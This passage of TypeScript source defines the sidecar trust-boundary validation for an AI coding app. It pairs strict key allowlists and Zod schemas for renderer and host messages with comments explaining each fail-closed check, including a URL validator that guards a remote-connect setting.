    ['permission.response', new Set(['type', 'requestId', 'response'])],
    // C2 (PERMISSION-BOUNDARY.md §3). NOTE: no `destination` key — scope is
    // pinned to `session` at the sidecar; a renderer that tries to send one
    // is rejected here.
    ['permission.setMode', new Set(['type', 'requestId', 'mode'])],
    // C5 (P4-20, ASK-USER-QUESTION-ANSWER.md). The renderer authors ONLY the
    // per-question `answers` (option indices + built-in "Other…" freeform); the
    // inner `{optionIndices, other}` shape is closed by the sidecar-local Zod
    // schema below (checkStrictKeys guards only top-level keys).
    ['askUserQuestion.answer', new Set(['type', 'requestId', 'answers'])],
    // P4-5 account verbs (app-owned; see ACCOUNT_VERB_TYPES). Each key set is the
    // exact renderer-facing contract; anything else is rejected before the Zod
    // parse. `account.delete` requires `confirm` (destructive → fail-closed).
    ['account.switch', new Set(['type', 'requestId', 'accountId', 'provider'])],
    ['account.rename', new Set(['type', 'requestId', 'accountId', 'alias'])],
    ['account.delete', new Set(['type', 'requestId', 'accountId', 'confirm'])],
    ['account.logout', new Set(['type', 'requestId'])],
    ['account.touchAll', new Set(['type', 'requestId'])],
    ['account.login', new Set(['type', 'requestId', 'provider'])],
    // P4-15 OAuth login sub-protocol. The renderer authors ONLY the user-typed
    // code/alias string — never a token; the engine owns every credential write.
    ['account.oauthPasteCode', new Set(['type', 'requestId', 'code'])],
    ['account.oauthAlias', new Set(['type', 'requestId', 'alias'])],
    ['account.oauthCancel', new Set(['type', 'requestId'])],
    ['account.profileDeleted', new Set(['type', 'requestId', 'accountId'])],
    // P4-15 workspace-trust accept verb (app-owned; see WORKSPACE_TRUST_VERB_TYPES).
    // HC1: no path key — the sidecar trusts only its own spawn cwd.
    ['workspace.trust', new Set(['type', 'requestId'])],
    // P4-8b agent-mode set verb (app-owned; see AGENT_MODE_VERB_TYPES). The
    // renderer authors ONLY the boolean intent — any other key is rejected.
    ['agent-mode.set', new Set(['type', 'requestId', 'active'])],
    // P4-8b task-control STOP verb (app-owned; see TASK_CONTROL_VERB_TYPES). The
    // renderer authors ONLY the target taskId — any other key is rejected.
    ['task.stop', new Set(['type', 'requestId', 'taskId'])],
    // The terminal counterpart (CC-32 follow-up): same single renderer-authored
    // key, so a forged `evictAfter`/`retain` never reaches the engine's guards.
    ['task.dismiss', new Set(['type', 'requestId', 'taskId'])],
    // Terminal Ctrl+B parity. The sidecar chooses from its own live store, so
    // the renderer supplies no task id or task-state fields.
    ['task.background', new Set(['type', 'requestId'])],
    // The per-worker counterpart. One renderer-authored key, and it is a
    // `toolUseId` rather than a task id — see `TaskBackgroundOneMessage`. A
    // forged `taskId`/`isBackgrounded` key is rejected here before the Zod parse,
    // so the renderer can never name engine task state.
    ['task.background.one', new Set(['type', 'requestId', 'toolUseId'])],
    // D1b prompt recall (app-owned; see PROMPT_RECALL_VERB_TYPES). It takes back
    // everything of the user's that is still waiting, so it has no target and
    // the renderer authors NOTHING but the correlation id. A forged `id`,
    // `agentId`, or `all` key is rejected here before the Zod parse.
    ['prompt.recall', new Set(['type', 'requestId'])],
    // Force-send is bound to an engine-minted queued prompt id. Any attempt to
    // name a task, inject prompt content, or author queue priority is rejected.
    ['prompt.force', new Set(['type', 'requestId', 'promptId'])],
    // P4-24c composer run-control verbs (app-owned; see RUN_CONTROL_VERB_TYPES). The
    // renderer authors ONLY the value/selection — any other key is rejected.
    ['model.set', new Set(['type', 'requestId', 'model'])],
    ['effort.set', new Set(['type', 'requestId', 'effort'])],
    ['fast.set', new Set(['type', 'requestId', 'active'])],
    // P4-6b session-action verbs (app-owned; see SESSION_ACTION_VERB_TYPES). The
    // renderer authors ONLY intent. Any other key is rejected fail-closed.
    ['session.rename', new Set(['type', 'requestId', 'title'])],
    ['session.export', new Set(['type', 'requestId'])],
    ['session.branch', new Set(['type', 'requestId'])],
    ['session.editFromMessage', new Set(['type', 'requestId', 'userMessageId'])],
    ['session.branchFromMessage', new Set(['type', 'requestId', 'userMessageId'])],
    // P4-29 — the renderer authors ONLY the tag name (empty string = remove).
    ['session.tag', new Set(['type', 'requestId', 'tag'])],
    // Usage stats query verb — real engine-backed aggregation
    ['stats.query', new Set(['type', 'requestId', 'range'])],
    // IDLE-PARK (decisions/IDLE-PARK.md §2/§6). Host-originated (no preload
    // channel forwards it), but on the closed allowlist as defence-in-depth. The
    // frame carries NO renderer-authored state — only `type` + `requestId`; any
    // other key is rejected before the sidecar-local Zod parse.
    ['app.park', new Set(['type', 'requestId'])],
    // P4-13 RemoteSettings verbs (app-owned; see REMOTE_VERB_TYPES).
    ['remoteSettings.bridgeToggle', new Set(['type', 'requestId', 'enable'])],
    ['remoteSettings.directConnect', new Set(['type', 'requestId', 'serverUrl'])],
    // P4-19 settings write verb (app-owned; see SETTINGS_VERB_TYPES). The exact
    // renderer-facing contract; any other key is rejected before the Zod parse.
    ['settings.setValue', new Set(['type', 'requestId', 'source', 'key', 'value'])],
    // Context-breakdown refresh (app-owned; see CONTEXT_BREAKDOWN_VERB_TYPES).
    // The renderer authors NOTHING but a correlation id: the analysis reads
    // engine-side session state only. Any other key is rejected fail-closed.
    ['context-breakdown.request', new Set(['type', 'requestId'])],
    // Load earlier messages (decisions/HISTORY-LOAD-EARLIER.md).
    // Renderer-parameterless by decision: the renderer authors NOTHING but a
    // correlation id, so there is no cursor, offset, count or path to forge.
    // `viewAnchorUuid` is the one exception and is not renderer-authored: main
    // stamps it at `forward` from its OWN replay ring, dropping whatever the
    // renderer sent, so a forged one cannot reach here. It is allowlisted and
    // uuid-shape-checked all the same, because the sidecar is the trust
    // boundary and a main-side check is never sufficient on its own
    // (SECURITY-MINIMUM §2 R2). It authorizes nothing: it is compared for
    // equality against uuids from this sidecar's own disk read. Any OTHER key
    // is rejected fail-closed here, BEFORE the sidecar-local Zod parse.
    ['history.loadEarlier', new Set(['type', 'requestId', 'viewAnchorUuid'])],
    // HOST-REQUEST-PLANE HR5 — the two MAIN-originated inbound kinds. No preload
    // channel forwards either one and no renderer can author one, but they are
    // on the closed allowlist all the same, because the sidecar is the trust
    // boundary and a main-side check is never sufficient on its own
    // (SECURITY-MINIMUM §2 R2). These are the ONLY two the amended Addendum
    // admits; a third is a re-opened ruling, not an addition.
    //
    // `host.result` answers a request THIS sidecar minted the id for, so an
    // unmatched id settles nothing and is dropped downstream. `peer.deliver`
    // carries main-stamped identity (`from`, `fromSessionId`) and a
    // main-derived hop chain, all of which the sidecar treats as DATA: it is
    // never read as authority, and the chain is never authored on this side.
    ['host.result', new Set(['type', 'requestId', 'ok', 'value', 'error'])],
    [
      'peer.deliver',
      new Set(['type', 'messageId', 'from', 'fromSessionId', 'text', 'untagged']),
    ],
    ['app.ping', new Set(['type', 'nonce'])],
  ])
  // `submitId` is admitted (SubmitOptions.submitId): the renderer's own
  // correlation id, which the sidecar answers with a `submit.result`. It is
  // renderer-authored, so it is bounded and type-checked by
  // `submitCorrelationSchema` below, and it authorizes nothing — unlike
  // `options.uuid`, which is engine identity and stays rejected.
  const allowedOptionKeys = new Set(['isMeta', 'goalSnapshot', 'submitId'])
  // The renderer-facing permission contract (protocol.ts PermissionResponseInput)
  // exposes ONLY these keys. The reused Zod schema additionally accepts host-only
  // escalations (allow.updatedPermissions, deny.interrupt) that the renderer must
  // not be able to set; reject any key outside this allowlist rather than let the
  // Zod parse silently strip it or forward `interrupt` to the engine.
  // `applySuggestions` (C1) is a renderer-facing key: an index selection among
  // the engine-minted suggestions, validated in validateSuggestionSelection.
  const allowedResponseKeys = new Set([
    'behavior',
    'updatedInput',
    'message',
    'applySuggestions',
  ])

  // `Map.get`, not `key in obj` — an inherited key like "constructor" or
  // "toString" must NOT be treated as a known message type (it would also crash
  // a plain-object lookup by resolving to a prototype function).
  if (typeof type !== 'string') {
    return `unknown message type: ${String(type)}`
  }
  const allowed = allowedByType.get(type)
  if (!allowed) {
    return `unknown message type: ${type}`
  }
  for (const key of Object.keys(obj)) {
    if (!allowed.has(key)) {
      return `unexpected key "${key}" on ${type}`
    }
  }

  if (type === 'app.submit' && obj.options !== undefined) {
    if (typeof obj.options !== 'object' || obj.options === null || Array.isArray(obj.options)) {
      return 'options must be an object'
    }
    for (const key of Object.keys(obj.options)) {
      if (!allowedOptionKeys.has(key)) {
        return `unexpected key "${key}" on app.submit.options`
      }
    }
  }

  if (type === 'permission.response' && obj.response !== undefined) {
    if (
      typeof obj.response !== 'object' ||
      obj.response === null ||
      Array.isArray(obj.response)
    ) {
      return 'response must be an object'
    }
    for (const key of Object.keys(obj.response)) {
      if (!allowedResponseKeys.has(key)) {
        return `unexpected key "${key}" on permission.response.response`
      }
    }
  }

  return null
}

/**
 * C2 — sidecar-LOCAL schema for `permission.setMode`
 * (PERMISSION-BOUNDARY.md §3). Deliberately NOT part of the engine's shared
 * `appClientMessageSchema` (the WS server shares that and has no handler for
 * this frame). The mode allowlist is the wire constant; the classifier-backed
 * `auto` availability check runs before this parse.
 */
const permissionSetModeMessageSchema = z.object({
  type: z.literal('permission.setMode'),
  requestId: z.string().min(1),
  mode: z.enum(PERMISSION_SET_MODE_MODES),
})

/**
 * IDLE-PARK (decisions/IDLE-PARK.md §6) — sidecar-LOCAL schema for `app.park`.
 * App-owned, NOT part of the engine's shared `appClientMessageSchema`. The frame
 * carries no renderer-authored state — just a length-bounded `requestId` (like
 * every other renderer-controlled string); `checkStrictKeys` has already rejected
 * any key beyond `{type, requestId}`, so this parse only enforces the value types.
 */
const appParkMessageSchema = z.object({
  type: z.literal('app.park'),
  requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
})

/**
 * Sidecar-LOCAL schema for `history.loadEarlier`
 * (decisions/HISTORY-LOAD-EARLIER.md §Shape). App-owned, NOT part of the
 * engine's shared `appClientMessageSchema`. The frame carries no
 * renderer-authored state beyond a length-bounded `requestId`, and
 * `checkStrictKeys` has already REJECTED (not stripped) any key beyond
 * `{type, requestId, viewAnchorUuid}`, so this parse only enforces the value
 * types. Everything the read is bounded by — which file, how many bytes,
 * whether one is already running — is decided on this side of the boundary and
 * appears nowhere here.
 *
 * `viewAnchorUuid` is main-authored (see the allowlist comment above) and
 * optional: absent means main had nothing to add, which is the pre-existing
 * behaviour. Shape-checked with the same uuid regex the edit-from-message verbs
 * use, because it is only ever equality-compared against `randomUUID()` values
 * this sidecar read off its own transcript — anything else could never match,
 * so admitting it would buy nothing.
 */
const historyLoadEarlierMessageSchema = z.object({
  type: z.literal('history.loadEarlier'),
  requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  viewAnchorUuid: z
    .string()
    .regex(/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{0,12}$/i)
    .optional(),
})

/**
 * HOST-REQUEST-PLANE HR5 — sidecar-LOCAL schemas for the two main-originated
 * inbound kinds. App-owned, NOT part of the engine's shared
 * `appClientMessageSchema` (the WS server shares that schema and has no handler
 * for either), and `checkStrictKeys` has already REJECTED any key outside the
 * closed sets above, so these parses enforce the VALUE types.
 *
 * `value` is validated PER VERB. The sidecar knows which verb each pending
 * request asked for, so the right schema is always available at the moment the
 * result lands; leaving it `z.unknown()` and telling callers to narrow was the
 * one inbound field on this plane with no schema behind it, and it handed every
 * tool the same runtime-narrowing chore plus a cast that hid the gap. HR5 says
 * an inbound kind gets a sidecar-local schema, and this is the rest of that.
 *
 * The shapes are structural only. `peers.list` in particular carries an
 * `engineSessionId` a reader joins into a transcript path, so it is checked to
 * be a string or null here rather than trusted from a frame; nothing downstream
 * has to re-derive that.
 */
const hostResultEnvelopeSchema = z.object({
  type: z.literal('host.result'),
  requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  ok: z.boolean(),
  value: z.unknown().optional(),
  error: z
    .object({
      code: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
      message: z.string().max(MAX_TEXT_FIELD_CHARS),
    })
    .strict()
    .optional(),
})

const peerNameSchema = z.string().min(1).max(MAX_TEXT_FIELD_CHARS)
const peerIdSchema = z.string().min(1).max(MAX_TEXT_FIELD_CHARS)

const peerDescriptorSchema = z
  .object({
    name: peerNameSchema,
    appSessionId: peerIdSchema,
    engineSessionId: peerIdSchema.nullable(),
    status: z.enum(['live', 'parked', 'closed']),
    presence: z.enum(ACTIVITY_PRESENCES).optional(),
    createdBy: z
      .object({ appSessionId: peerIdSchema, name: peerNameSchema.nullable() })
      .strict()
      .optional(),
    title: z.string().max(MAX_TEXT_FIELD_CHARS).nullable(),
    lastActivity: z.number().finite(),
  })
  .strict()

const peerDeliverOutcomeSchema = z.union([
  z.literal('queued_live'),
  z.literal('queued_wake'),
  ...PEER_DELIVER_REFUSAL_REASONS.map(reason => z.literal(`refused:${reason}` as const)),
])

/** One schema per verb, keyed so the pending request selects its own. */
const HOST_RESULT_VALUE_SCHEMAS = {
  'peers.list': z.object({ peers: z.array(peerDescriptorSchema) }).strict(),
  'peer.create': z
    .object({
      name: peerNameSchema,
      appSessionId: peerIdSchema,
      failedStep: z.enum(['ready', 'prompt']).optional(),
    })
    .strict(),
  'peer.deliver': z
    .object({ messageId: peerIdSchema, outcome: peerDeliverOutcomeSchema })
    .strict(),
  'peer.ack': z.object({ messageId: peerIdSchema }).strict(),
} as const satisfies Record<HostRequestVerb, z.ZodType>

/**
 * `peer.deliver` — one routed peer message. Every field is main-stamped except
 * `text`, which is the only model-authored content that crosses; it is bounded
 * at main by `MAX_PEER_TEXT_BYTES` and re-bounded here because the sidecar does
 * not take main's word for a size any more than for anything else.
 *
 * There is no hop chain here: it had no consumer on this side, and an inbound
 * field nothing reads is boundary surface bought for nothing. The loop stop is
 * entirely main's (§4 step 2).
 *
 * `untagged` is the creation-prompt flag (PEER-SESSIONS §5). Optional, and
 * absent means TAGGED, which is the fail-closed direction: a message that
 * forgets the flag is wrapped and therefore judged by the auto-mode classifier
 * as never user intent, which is the conservative half of that rule.
 */
const peerDeliverMessageSchema = z.object({
  type: z.literal('peer.deliver'),
  messageId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  from: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  fromSessionId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  text: z.string().min(1).refine(
    value => new TextEncoder().encode(value).byteLength <= MAX_PEER_TEXT_BYTES,
    { message: 'text is too long' },
  ),
  untagged: z.boolean().optional(),
})

/**
 * C5 (P4-20, ASK-USER-QUESTION-ANSWER.md) — sidecar-LOCAL schema for the
 * AskUserQuestion answer frame. App-owned, NOT part of the engine's shared
 * schema. Structural only: the renderer authors option INDICES + a bounded
 * "Other…" freeform string; the sidecar re-attaches the engine's own option
 * labels and re-reads the gated questions (handleAskUserQuestionAnswer), so the
 * semantic checks (index in range, cardinality vs multiSelect, question count)
 * are done against the LIVE pending request, never trusted from the frame. The
 * inner `{optionIndices, other}` object is `.strict()` so an extra nested key is
 * rejected, not stripped (checkStrictKeys guards only the top level).
 */
const askUserQuestionAnswerSchema = z
  .object({
    optionIndices: z.array(z.number().int().nonnegative()),
    other: z.string().max(MAX_QUESTION_ANSWER_CHARS).optional(),
  })
  .strict()

const askUserQuestionAnswerMessageSchema = z.object({
  type: z.literal('askUserQuestion.answer'),
  requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  answers: z.array(askUserQuestionAnswerSchema).min(1).max(MAX_ANSWER_QUESTIONS),
})

/**
 * P4-5 — sidecar-LOCAL schemas for the account lifecycle verbs (protocol.ts:
 * ACCOUNT_VERB_TYPES). App-owned, NOT part of the engine's shared schema.
 * Structural only: shape + bounds. The business rules (target exists, alias
 * unique, vault-backed) are re-checked against the LIVE pool in the domain (T6),
 * never trusted from the frame. `requestId`/`accountId` are length-bounded like
 * every other renderer-controlled string; `confirm` MUST be literal `true`
 * (a missing/false confirm on a destructive verb is rejected here, fail-closed).
 */
const accountRequestIdSchema = z.string().min(1).max(MAX_TEXT_FIELD_CHARS)
const accountIdSchema = z.string().min(1).max(MAX_TEXT_FIELD_CHARS)
const accountAliasSchema = z.string().min(1).max(MAX_TEXT_FIELD_CHARS)

const accountVerbMessageSchema = z.discriminatedUnion('type', [
  z.object({
    type: z.literal('account.switch'),
    requestId: accountRequestIdSchema,
    accountId: accountIdSchema,
    provider: z.enum(['anthropic', 'openai']).optional(),
  }),
  z.object({
    type: z.literal('account.rename'),
    requestId: accountRequestIdSchema,
    accountId: accountIdSchema,
    alias: accountAliasSchema,
  }),
  z.object({
    type: z.literal('account.delete'),
    requestId: accountRequestIdSchema,
    accountId: accountIdSchema,
    confirm: z.literal(true),
  }),
  z.object({
    type: z.literal('account.logout'),
    requestId: accountRequestIdSchema,
  }),
  z.object({
    type: z.literal('account.touchAll'),
    requestId: accountRequestIdSchema,
  }),
  z.object({
    type: z.literal('account.login'),
    requestId: accountRequestIdSchema,
    provider: z.enum(['anthropic', 'openai']).optional(),
  }),
  // P4-15 — OAuth login sub-protocol. Structural only (shape + bounds); the
  // engine re-validates the alias and consumes the code. `code`/`alias` are
  // length-bounded like every renderer-controlled string. `alias` may be empty
  // (the "leave blank" skip); `code` must be non-empty to be worth submitting.
  z.object({
    type: z.literal('account.oauthPasteCode'),
    requestId: accountRequestIdSchema,
    code: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  }),
  z.object({
    type: z.literal('account.oauthAlias'),
    requestId: accountRequestIdSchema,
    alias: z.string().max(MAX_TEXT_FIELD_CHARS),
  }),
  z.object({
    type: z.literal('account.oauthCancel'),
    requestId: accountRequestIdSchema,
  }),
])

const accountProfileDeletedMessageSchema = z.object({
  type: z.literal('account.profileDeleted'),
  requestId: accountRequestIdSchema,
  accountId: accountIdSchema,
})

/**
 * P4-15 — sidecar-LOCAL schema for the workspace-trust accept verb (protocol.ts:
 * WORKSPACE_TRUST_VERB_TYPES). App-owned, NOT part of the engine's shared schema.
 * Structural only: shape + a bounded `requestId`. There is NO path field — HC1:
 * the sidecar trusts only its OWN spawn cwd, never a renderer-supplied directory.
 */
const workspaceTrustMessageSchema = z.object({
  type: z.literal('workspace.trust'),
  requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
})

/**
 * Sidecar-LOCAL schema for the context-breakdown request (protocol.ts:
 * CONTEXT_BREAKDOWN_VERB_TYPES). App-owned, NOT part of the engine's shared
 * schema. Structural only, and there is nothing else to check: the frame carries
 * no renderer-authored state at all — the analysis reads engine-side session
 * state exclusively — so a bounded `requestId` is the whole surface.
 */
/**
 * Minimum gap between two real context analyses. Chosen against what the analysis
 * costs (a whole-transcript read plus ~10 token counts), not against how fast the
 * numbers move — they can only change when a turn completes.
 */
const CONTEXT_BREAKDOWN_MIN_INTERVAL_MS = 15_000

const contextBreakdownMessageSchema = z.object({
  type: z.literal('context-breakdown.request'),
  requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
})

/**
 * P4-8b — sidecar-LOCAL schema for the agent-mode set verb (protocol.ts:
 * AGENT_MODE_VERB_TYPES). App-owned, NOT part of the engine's shared schema.
 * Structural only: shape + a bounded `requestId` + a strict boolean `active`.
 * A non-boolean `active` is rejected here fail-closed before the domain switches
 * mode; the renderer never authors anything but the boolean intent.
 */
const agentModeSetMessageSchema = z.object({
  type: z.literal('agent-mode.set'),
  requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  active: z.boolean(),
})

/**
 * P4-8b — sidecar-LOCAL schema for the task-control STOP verb (protocol.ts:
 * TASK_CONTROL_VERB_TYPES). App-owned, NOT part of the engine's shared schema.
 * Structural only: shape + a bounded `requestId` + a bounded `taskId`. The
 * BUSINESS validation (does the task exist, is it running, is its type stoppable)
 * is the engine `stopTask`'s own concern in the domain — the boundary checks shape
 * only, never trusting the frame. A non-string/absent `taskId` is rejected here
 * fail-closed before the domain runs any kill.
 */
const taskControlVerbMessageSchema = z.discriminatedUnion('type', [
  z.object({
    type: z.literal('task.stop'),
    requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
    taskId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  }),
  // The dismiss half carries the SAME renderer-authored surface (a target id and
  // nothing else); which of the two verbs is legal for a given task is the
  // domain's live-store business check, never the boundary's.
  z.object({
    type: z.literal('task.dismiss'),
    requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
    taskId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  }),
  z.object({
    type: z.literal('task.background'),
    requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  }),
  z.object({
    type: z.literal('task.background.one'),
    requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
    toolUseId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  }),
])

/**
 * D1b — sidecar-LOCAL schema for the prompt-recall verb (protocol.ts:
 * PROMPT_RECALL_VERB_TYPES). App-owned, NOT part of the engine's shared schema.
 * The verb carries no parameters at all, so this is shape + a bounded
 * `requestId`; WHAT gets recalled is decided entirely server-side from the live
 * queue. Same posture as `context-breakdown.request`.
 */
const promptRecallMessageSchema = z.object({
  type: z.literal('prompt.recall'),
  requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
})

const promptForceMessageSchema = z.object({
  type: z.literal('prompt.force'),
  requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  promptId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
})

/**
 * D1b — what the user is told about a recall, and nothing more. The ordinary
 * outcome is silent at the renderer (the message reappearing in the composer is
 * the whole story, the D5 refused-submit precedent), so these strings exist for
 * the case that contradicts what the user just did.
 */
function promptRecallMessage(
  recalled: number,
  alreadyDelivered: number,
): string {
  if (alreadyDelivered === 0) {
    return recalled === 0 ? 'Nothing was waiting.' : 'Took the message back.'
  }
  if (recalled === 0) {
    return alreadyDelivered === 1
      ? 'That message already went to the model.'
      : 'Those messages already went to the model.'
  }
  return alreadyDelivered === 1
    ? '1 message already went to the model, so it stayed.'
    : `${alreadyDelivered} messages already went to the model, so they stayed.`
}

/**
 * The load-earlier outcome, in the user's terms. Says only what is surprising
 * (CLAUDE.md §7): that more is still out of reach, or that there was nothing
 * left to fetch. A successful, complete load says the plain thing and stops.
 */
function loadEarlierMessage(added: number, complete: boolean): string {
  if (added === 0) {
    return complete
      ? 'No earlier messages to load.'
      : 'No earlier messages could be loaded.'
  }
  return complete
    ? 'Earlier messages loaded.'
    : 'Earlier messages loaded. Some older ones are still out of reach.'
}

/**
 * P4-24c — sidecar-LOCAL schema for the composer run-control set verbs (protocol.ts:
 * RUN_CONTROL_VERB_TYPES). App-owned, NOT part of the engine's shared schema.
 * Structural only: shape + a bounded `requestId` + a bounded value/selection. The
 * BUSINESS validation (is `model` a real option, is `effort` a valid level) is the
 * engine setter's own concern in the domain — the boundary checks shape only, never
 * trusting the frame. A non-string model/effort or non-boolean `active` is rejected
 * here fail-closed before the domain runs any setter.
 */
const runControlVerbMessageSchema = z.discriminatedUnion('type', [
  z.object({
    type: z.literal('model.set'),
    requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
    model: z.string().min(1).max(MAX_TEXT_FIELD_CHARS).nullable(),
  }),
  z.object({
    type: z.literal('effort.set'),
    requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
    effort: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  }),
  z.object({
    type: z.literal('fast.set'),
    requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
    active: z.boolean(),
  }),
])

/**
 * P4-6b — sidecar-LOCAL schema for the session-action verbs (protocol.ts:
 * SESSION_ACTION_VERB_TYPES). App-owned, NOT part of the engine's shared schema.
 * Structural only: shape + a bounded `requestId` + (rename) a bounded `title`. The
 * SEMANTIC checks (title non-empty after trim; the fork/render succeed) are the
 * domain's concern — the boundary checks shape only, never trusting the frame. A
 * non-string or over-long title, or a missing requestId, is rejected here
 * fail-closed before the domain runs any engine op. Export/branch carry no params.
 */
const sessionActionVerbMessageSchema = z.discriminatedUnion('type', [
  z.object({
    type: z.literal('session.rename'),
    requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
    title: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  }),
  z.object({
    type: z.literal('session.export'),
    requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  }),
  z.object({
    type: z.literal('session.branch'),
    requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
  }),
  z.object({
    type: z.literal('session.editFromMessage'),
    requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
    userMessageId: z
      .string()
      .regex(
        /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{0,12}$/i,
      ),
  }),
  z.object({
    type: z.literal('session.branchFromMessage'),
    requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
    userMessageId: z
      .string()
      .regex(
        /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{0,12}$/i,
      ),
  }),
  // P4-29 tag: unlike `title`, an EMPTY string is meaningful here — it is the
  // engine's own remove form (`src/commands/tag/tag.tsx:141`) — so the bound is
  // length-only. Trimming stays a domain concern, as with rename.
  z.object({
    type: z.literal('session.tag'),
    requestId: z.string().min(1).max(MAX_TEXT_FIELD_CHARS),
    tag: z.string().max(MAX_TEXT_FIELD_CHARS),
  }),
])

const statsQueryMessageSchema = z.object({
  type: z.literal('stats.query'),
  range: z.enum(['7d', '30d']),
  requestId: z.string().max(MAX_TEXT_FIELD_CHARS).optional(),
})

/**
 * P4-13 — sidecar-LOCAL schemas for the RemoteSettings verbs (protocol.ts:
 * REMOTE_VERB_TYPES). App-owned, NOT part of the engine's shared schema.
 * Structural only: shape + bounds; the domain re-derives everything else
 * (the real bridge flag, the real cwd) rather than trusting the frame.
 */
const remoteRequestIdSchema = z.string().min(1).max(MAX_TEXT_FIELD_CHARS)

/**
 * `serverUrl` is the one renderer-authored string this boundary turns into a
 * real outbound request from the PRIVILEGED sidecar: the domain hands it to
 * `createDirectConnectSession`, which POSTs `{cwd}` to `${serverUrl}/sessions`
 * (`src/server/createDirectConnectSession.ts`). A length-only bound therefore
 * gave a compromised renderer exactly the egress channel SECURITY-MINIMUM T3
 * relies on `connect-src 'self'` to deny, plus the session cwd. Validate the
 * shape HERE, at the trust boundary, never in the domain (§2 R2):
 *
 *   - it must parse as an absolute URL;
 *   - `http:`/`https:` only. That is what `fetch` accepts, so nothing that
 *     could ever have worked is lost;
 *   - no embedded `user:pass@` credentials — they would ride the request;
 *   - no query and no fragment. The engine appends `/sessions` to this exact
 *     string, so neither can be meaningful here, and both are free-form
 *     attacker-controlled capacity;
 *   - a non-empty host.
 *
 * What is deliberately NOT decided here: which HOSTS are reachable (loopback
 * only? an operator-configured list?). That is a product decision, so this
 * closes the shape hole without inventing a policy.
 */
function isAllowedRemoteServerUrl(raw: string): boolean {
  let url: URL
  try {
    url = new URL(raw)
  } catch {
    return false
  }
  if (url.protocol !== 'http:' && url.protocol !== 'https:') return false
  if (url.username !== '' || url.password !== '') return false
  if (url.search !== '' || url.hash !== '') return false
  return url.hostname !== ''
}

const remoteServerUrlSchema = z
  .string()
  .min(1)
  .max(MAX_TEXT_FIELD_CHARS)
  .refine(isAllowedRemoteServerUrl, {
    message:
      'Enter an http or https address with no username, password, query, or fragment.',
  })

const remoteVerbMessageSchema = z.discriminatedUnion('type', [
  z.object({
    type: z.literal('remoteSettings.bridgeToggle'),
    requestId: remoteRequestIdSchema,
    enable: z.boolean(),
  }),
  z.object({
    type: z.literal('remoteSettings.directConnect'),
    requestId: remoteRequestIdSchema,
    serverUrl: remoteServerUrlSchema,
  }),
])

/**
 * P4-19 — sidecar-LOCAL schema for the settings write verb (protocol.ts:
 * SETTINGS_VERB_TYPES). App-owned, NOT part of the engine's shared schema.
 * Structural only: shape + editable-source enum + bounded key/value. The
 * per-KEY value-type match (boolean vs enum vs int) and the write-vs-CLEAR
 * discrimination are enforced separately by `validateEditableSettingWrite` at
 * the boundary (handleSettingsVerb), and the domain re-checks all three as the
 * last gate before disk. `source` is the closed editable-layer enum — policy/flag
 * can never be named here.
 */
const settingsRequestIdSchema = z.string().min(1).max(MAX_TEXT_FIELD_CHARS)
const settingsKeySchema = z.string().min(1).max(MAX_TEXT_FIELD_CHARS)
// P4-41 — `null` is admitted as the CLEAR request (remove the key from the
// layer), never as a value. It is structurally outside the scalar union above,
// so the two can never be confused here or downstream; `validateEditableSettingWrite`
// is the one place that branches on it.
const settingsValueSchema = z.union([
  z.boolean(),
  z.string().max(MAX_TEXT_FIELD_CHARS),
  z.number(),
  z.null(),
])

const settingsVerbMessageSchema = z.discriminatedUnion('type', [
  z.object({
    type: z.literal('settings.setValue'),
    requestId: settingsRequestIdSchema,
    source: z.enum([...EDITABLE_SETTING_SOURCES]),
    key: settingsKeySchema,
    value: settingsValueSchema,
  }),
])

/**
 * C3 — convert the engine's live `ToolPermissionContext` into the wire
 * snapshot (PERMISSION-BOUNDARY.md §4). Pure JSON POJO: the context's
 * `additionalWorkingDirectories` is a Map, which `checkJsonSafe` fail-closes
 * on, so it becomes an entries array here. Rule lists are copied so the frame
 * never aliases live engine state. Faithfulness rule: this is the ONLY place
 * a snapshot is built, and its input is always the engine's own context
 * object — never a renderer-side reconstruction.
 */
export function buildPermissionContextSnapshot(
  context: ToolPermissionContext,
  displayFacts: PermissionDisplayFacts = {
    managedRulesOnly: false,
    permissionClassifierEnabled: false,
  },
): PermissionContextSnapshot {
  const additionalWorkingDirectories: Array<{ path: string; source: string }> =
    []
  context.additionalWorkingDirectories.forEach(
    (entry: { path: string; source: string }) => {
      additionalWorkingDirectories.push({
        path: entry.path,
        source: entry.source,
      })
    },
  )
  return {
